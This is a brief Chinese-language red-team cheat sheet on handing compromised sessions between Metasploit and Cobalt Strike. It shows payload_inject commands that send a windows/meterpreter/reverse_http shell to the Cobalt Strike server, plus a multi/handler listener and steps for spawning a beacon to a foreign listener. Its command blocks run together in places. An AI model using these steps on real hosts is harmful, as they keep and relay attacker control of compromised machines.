# msf转cs

在cs中配置新监听器，beacon\_http即可，设置好监听ip和端口

使用msf payload\_inject模块注入一个新的cs的shell

```

backgroundlocal
/payload_injectset
 payload windows/meterpreter/reverse_httpset
 lhost cs的ipset
 lport cs的portset
 session 需要转换的session编号set disablepayloadhandler true


```

# cs转msf

在msf中开启通常的监听

```

use exploit/multi/handlerset
 payload windows/meterpreter/reverse_httpset
 lhost xx.xx.xx.xxset

 lport xxxx
```

在cs中选择已存在的shell，右键->spawn

选择foreign类型的监听器，填写msf的ip和端口

选择此监听器转换shell到msf
